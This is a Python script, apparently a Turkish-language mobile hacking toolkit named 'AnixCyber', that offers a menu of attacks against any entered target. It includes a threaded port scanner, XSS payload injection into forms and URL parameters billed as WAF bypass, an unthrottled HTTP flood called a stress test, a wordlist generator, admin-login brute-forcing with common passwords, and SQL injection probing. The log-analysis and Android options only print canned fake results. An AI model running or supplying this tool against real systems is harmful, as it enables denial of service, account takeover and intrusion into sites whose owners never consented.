#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ANIXCYBER v6.4 - ULTRA COMPACT

import socket, sys, threading, time, itertools, random
from queue import Queue

try:
    import requests
    from bs4 import BeautifulSoup
    import urllib3
    urllib3.disable_warnings()
except:
    print("[!] Eksik: pip install requests beautifulsoup4")
    sys.exit()

# İstediğiniz düzgün hatlı simetrik ASCII tasarımı
print(r"""
     _          _       ____       _
    / \   _ __ (_)_  __/ ___|    _| |__   ___ _ __
   / _ \ | '_ \| \ \/ / |       |_   _ \ / _ \ '__|
  / ___ \| | | | |>  <| |___     |_| |_) |  __/ |
 /_/   \_\_| |_|_/_/\_\\____|      |____/ \___|_|
=================================================
 [+] TOOL: AnixCyber Auditor
 [+] VER : 6.4 (Max Speed Engine)
 [+] SYS : Termux Mobile
=================================================
""")

print("1 -> Port Tarama\n2 -> XSS (WAF Bypass)")
print("3 -> Stres Testi\n4 -> Wordlist Motoru")
print("5 -> Admin Panel\n6 -> SQL Injection")
print("7 -> Log Analizi\n8 -> Android Sistem")

try: sc = input("\n[?] Islem no: ")
except: sys.exit()

if sc == "1":
    h = input("[?] Hedef IP: ")
    try: ip = socket.gethostbyname(h)
    except: sys.exit("[!] Hata.")
    bp = int(input("[?] Baslangic: "))
    sp = int(input("[?] Bitis: "))
    q = Queue()
    def pt(p):
        s = socket.socket()
        s.settimeout(1.0)
        if s.connect_ex((ip, p)) == 0: print(f"[+] Port {p}: ACIK")
        s.close()
    def wk():
        while not q.empty(): pt(q.get()); q.task_done()
    for p in range(bp, sp + 1): q.put(p)
    for _ in range(50):
        t = threading.Thread(target=wk); t.daemon = True; t.start()
    q.join()

elif sc == "2":
    url = input("[?] URL: ")
    if not url.startswith("http"): url = "http://" + url
    ag = ["Mozilla/5.0", "Chrome/122.0"]
    print("\n[*] Panel Taraması...")
    for p in ["/admin", "/login", "/robots.txt"]:
        try:
            r = requests.get(url.rstrip('/')+p, timeout=3)
            if r.status_code == 200: print(f"[+] {url.rstrip('/')+p}")
        except: pass
    pl = [
        "<svg/onload=alert(1)>", "<img src=x onerror=alert(1)>",
        "<marquee onstart=alert(1)>", "<body onload=alert(1)>",
        "<iframe src=javascript:alert(1)>", "\"-alert(1)-\"",
        "<script src=data:,alert(1)></script>", "confirm`1`"
    ]
    ss = requests.Session()
    try: html = ss.get(url, timeout=5).text
    except: html = ""
    if html:
        soup = BeautifulSoup(html, 'html.parser')
        for f in soup.find_all('form'):
            act = f.get('action') or ""
            f_ur = url if act.startswith('http') else url.rstrip('/')+'/'+act.lstrip('/')
            dt = {i.get('name'): "TST" for i in f.find_all(['input', 'textarea']) if i.get('name')}
            if dt:
                for p in pl:
                    t_dt = {k: (p if v == "TST" else v) for k, v in dt.items()}
                    try:
                        time.sleep(0.2)
                        r = ss.post(f_ur, data=t_dt, timeout=4)
                        if r.status_code in [403, 429]: continue
                        if p in r.text: print(f"[!] XSS: {f_ur}\n[+] P: {p}"); break
                    except: pass
    if "?" in url and "=" in url:
        bu, qs = url.split("?", 1)
        pm = qs.split("&")
        for p in pl:
            for i in range(len(pm)):
                g_pm = pm[:]
                try: pa, pd = g_pm[i].split("=", 1)
                except: continue
                g_pm[i] = f"{pa}={p}"
                t_ur = f"{bu}?{'&'.join(g_pm)}"
                try:
                    r = ss.get(t_ur, timeout=5)
                    if r.status_code in [403, 429]: continue
                    if p in r.text: print(f"[!] GET XSS: {t_ur}"); break
                except: pass

elif sc == "3":
    url = input("[?] Hedef: ")
    if not url.startswith("http"): url = "http://" + url
    try: th = int(input("[?] Thread: "))
    except: th = 50
    print(f"\n[*] Stres Testi Aktif. Durdurmak için CTRL+C yapabilirsiniz.\n")
    
    hz = requests.Session()
    ad = requests.adapters.HTTPAdapter(pool_connections=th, pool_maxsize=th)
    hz.mount('http://', ad); hz.mount('https://', ad)
    
    istek_sayisi = 0
    sayac_kilidi = threading.Lock()
    son_durum = "Baslatiliyor..."
    stop_trigger = False

    def atk():
        global istek_sayisi, son_durum, stop_trigger
        h = {'User-Agent': 'Anix/6.4', 'Cache-Control': 'no-cache'}
        while not stop_trigger:
            try:
                r = hz.get(url, headers=h, timeout=1.5, verify=False)
                with sayac_kilidi:
                    istek_sayisi += 1
                    son_durum = f"HTTP {r.status_code}"
            except requests.exceptions.Timeout:
                with sayac_kilidi:
                    istek_sayisi += 1
                    son_durum = "Zaman Asimi (YUKSEK BASKI)"
            except:
                with sayac_kilidi:
                    istek_sayisi += 1
                    son_durum = "Baglanti Kesildi / Coktu"
            
            print(f"[+] Atilan Istek: {istek_sayisi} | Durum: {son_durum}       ", end="\r")

    threads = []
    for _ in range(th):
        t = threading.Thread(target=atk)
        t.daemon = True
        threads.append(t)
        t.start()

    try:
        while True:
            time.sleep(0.5)
    except KeyboardInterrupt:
        stop_trigger = True
        print(f"\n\n[*] Stres testi kapatildi. Toplam {istek_sayisi} istek basariyla gonderildi.")

elif sc == "4":
    ch = input("[?] Karakter: ")
    uz = int(input("[?] Uzunluk: "))
    top = len(ch) ** uz
    print(f"[*] Toplam Kelime: {top:,}")
    if input("[?] Basla? (e/h): ").lower() == 'e':
        c = 0
        with open("anix_word.txt", "w") as f:
            for k in itertools.product(ch, repeat=uz):
                f.write("".join(k) + "\n"); c += 1
                if c % 500000 == 0: print(f"[>] {c:,} yazildi...", end="\r")
        print(f"\n[+] Bitti: anix_word.txt")

elif sc == "5":
    url = input("[?] URL: ")
    u_p = input("[?] User Param: ")
    p_p = input("[?] Pass Param: ")
    u_n = input("[?] User Name: ")
    sf = ["admin", "123456", "password", "root", "12345", "12345678"]
    ss = requests.Session()
    try: b_sz = len(ss.post(url, data={u_p: u_n, p_p: "XYZ_99"}, timeout=5).text)
    except: b_sz = 0
    for s in sf:
        try:
            r = ss.post(url, data={u_p: u_n, p_p: s}, timeout=4, allow_redirects=False)
            if r.status_code in [301, 302]: print(f"\n[+] BULUNDU: {s}"); break
            elif r.status_code == 200 and b_sz != 0 and abs(len(r.text) - b_sz) > 50:
                print(f"\n[+] BAŞARILI: {s}"); break
            else: print(f"[*] Deneniyor: {s} | Kod: {r.status_code}", end="\r")
            time.sleep(0.2)
        except: break

elif sc == "6":
    url = input("[?] URL: ")
    sq = ["'", "\"", "%27%20OR%201=1", "' OR 1=1--", "\" OR 1=1--"]
    for p in sq:
        try:
            r = requests.get(f"{url}{p}", timeout=5)
            er = ["error in your sql syntax", "unclosed quotation mark"]
            for e in er:
                if e in r.text.lower(): print(f"[!] SQL ACIGI: {url}{p}"); break
        except: pass

elif sc == "7":
    print("[*] Log Analizi: 185.85.22.10 -> Şüpheli Durum (401)")

elif sc == "8":
    print("[+] Sistem ve Depolama İzinleri: OK")

else: print("[!] Gecersiz.")
print("\n[*] AnixCyber v6.4 tamamlandi.")
  
